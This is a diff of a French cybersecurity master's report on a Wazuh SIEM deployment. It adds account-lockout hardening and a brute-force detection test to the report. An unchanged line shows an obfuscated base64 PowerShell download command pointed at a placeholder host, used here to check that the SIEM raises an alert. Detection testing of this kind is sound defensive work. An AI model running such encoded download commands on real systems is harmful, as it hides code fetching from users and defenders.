@@ -4,7 +4,7 @@
 * **Cursus :** Master Cybersécurité / Ingénierie Réseaux & Systèmes
 * **Sujet :** Déploiement, durcissement et industrialisation d'un SIEM Wazuh sur un réseau académique (Projet de Fin d'Études)
 * **Encadrant / Correcteur Pédagogique :** [Nom de l'encadrant]
-* **Date :** Juin 2026
+* **Date :** Juillet 2026
 
 ---
 
@@ -242,7 +242,7 @@ Pour les recommandations R15 (journalisation) et R16 (centralisation), c'est cou
 
 #### 2. Contrôles CIS v8
 
-Les contrôles CIS 8.11 et 8.12 (collecte et stockage des logs d'audit) sont couverts par la collecte automatisée sur une machine dédiée avec rétention de 30 jours minimum. Le CIS 4.1 (baseline sécurisée Windows) est adressé par le module SCA de Wazuh, qui analyse quotidiennement le parc par rapport au benchmark CIS Windows et fournit une note de conformité avec la liste des points non conformes.
+Les contrôles CIS 8.11 et 8.12 (collecte et stockage des logs d'audit) sont couverts par la collecte automatisée sur une machine dédiée avec rétention de 30 jours minimum. Le CIS 4.1 (baseline sécurisée Windows) est adressé par le module SCA de Wazuh, qui analyse quotidiennement le parc par rapport au benchmark CIS Windows. En fin de projet, on a aussi appliqué des mesures de durcissement concrètes, comme la règle CIS 26005 imposant le verrouillage de compte après 5 échecs consécutifs (`net accounts /lockoutthreshold:5`), ce qui a fait remonter le score de conformité.
 
 #### 3. Norme ISO/CEI 27001:2022
 
@@ -259,7 +259,11 @@ Pour valider le SOC avant sa livraison, j'ai mis en place un protocole d'attaque
    * Commande exécutée : `powershell.exe -EncodedCommand IAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0AJwApAA==`
    * Résultat attendu : log capturé par Sysmon, classé en alerte de niveau 9.
 
-Le succès de ces tests valide le pipeline complet de détection : génération du log local → capture par l'agent → chiffrement du flux → analyse regex sur le Manager → indexation OpenSearch → visualisation Dashboard.
+3. **Simulation d'attaque Brute Force locale :**
+   * Action réalisée : exécution répétée de tentatives d'authentification en échec via script PowerShell, générant de multiples Event ID 4625.
+   * Résultat attendu : remontée des alertes d'échec de connexion sur le Dashboard, couplée au verrouillage effectif du compte après 5 tentatives (règle CIS 26005 appliquée via `net accounts /lockoutthreshold:5`).
+
+Le succès de ces tests valide le pipeline complet de détection : génération du log local → capture par l'agent → chiffrement du flux → analyse sur le Manager → indexation OpenSearch → visualisation Dashboard.
 
 ---
 
